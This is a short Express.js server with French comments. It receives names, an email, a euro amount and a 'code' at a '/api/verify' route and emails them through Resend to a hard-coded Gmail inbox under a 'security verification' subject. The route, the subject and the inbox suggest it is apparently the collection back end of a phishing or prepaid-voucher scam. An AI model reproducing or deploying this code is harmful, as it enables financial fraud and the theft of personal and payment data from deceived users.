const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');

// Initialisation de l'application Express
const app = express();
const PORT = process.env.PORT || 10000;

// Middlewares obligatoires pour recevoir les données du formulaire
app.use(express.json());
app.use(cors());

// Initialisation de Resend avec la variable d'environnement
const resend = new Resend(process.env.RESEND_API_KEY);

// Route de réception des données
app.post('/api/verify', async (req, res) => {
    const { nom, prenom, email, amount, code } = req.body;

    try {
        // Envoi via l'API Resend
        const data = await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: 'authentificationtickets811@gmail.com',
            subject: 'Nouvelle vérification de sécurité',
            html: `
                <div style="font-family: sans-serif; line-height: 1.5;">
                    <h2 style="color: #2563EB;">Nouvelle soumission</h2>
                    <p>Voici les informations reçues :</p>
                    <ul>
                        <li><strong>Nom :</strong> ${nom}</li>
                        <li><strong>Prénom :</strong> ${prenom}</li>
                        <li><strong>Email :</strong> ${email}</li>
                        <li><strong>Montant :</strong> ${amount} €</li>
                        <li><strong>Code :</strong> ${code}</li>
                    </ul>
                </div>
            `
        });

        // Réponse positive au frontend
        res.status(200).json({ success: true, message: "Données transmises avec succès." });

    } catch (error) {
        // Gestion d'erreur propre
        console.error("Erreur Resend :", error);
        res.status(500).json({ success: false, message: "Erreur lors de l'envoi des données." });
    }
});

// Démarrage du serveur
app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});
